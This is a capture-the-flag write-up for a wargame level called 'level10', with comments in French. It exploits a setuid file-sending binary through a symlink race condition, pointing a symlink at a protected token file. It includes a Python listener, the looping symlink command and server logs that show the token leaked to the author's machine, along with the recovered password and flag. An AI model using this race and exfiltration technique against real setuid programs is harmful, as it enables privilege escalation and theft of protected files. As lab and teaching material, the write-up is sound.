# level10

```bash
$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
$ ./level10
./level10 file host
	sends file to host if you have access to it
```

```bash
# On creer un serveur python sur notre machine principal
import socket

def start_server(host='192.168.179.128', port=6969):
    # Create a socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to the address and port
    server_socket.bind((host, port))

    # Put the socket into listening mode
    server_socket.listen(5)
    print(f"Server listening on {host}:{port}")

    while True:
        # Accept a new connection
        client_socket, client_address = server_socket.accept()
        print(f"Connection from {client_address}")

        # Receive data
        data = client_socket.recv(1024)
        while data:
            print(f"Received: {data.decode('utf-8')}")
            data = client_socket.recv(1024)

        # Close the connection
        client_socket.close()
        print(f"Connection closed from {client_address}")

if __name__ == "__main__":
    start_server()
```

```bash
$ $(while true; do ln -sf /tmp/test /tmp/fake; ln -sf ~/token /tmp/fake; done)&
# plusieurs jusqu'à avoir le bon timing
$ ./level10 /tmp/fake 192.168.179.128
```

```bash
#Server Side
$ python3 server.py
Server listening on 192.168.179.128:6969
Connection from ('192.168.179.131', 56986)
Received: .*( )*.
test server

Connection closed from ('192.168.179.131', 56986)
Connection from ('192.168.179.131', 56987)
Received: .*( )*.

Received: test server

Connection closed from ('192.168.179.131', 56987)
Connection from ('192.168.179.131', 56988)
Received: .*( )*.

Received: test server

Connection closed from ('192.168.179.131', 56988)
Connection from ('192.168.179.131', 56989)
Received: .*( )*.

Received: woupa2yuojeeaaed06riuj63c

Connection closed from ('192.168.179.131', 56989)
```

```bash
$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
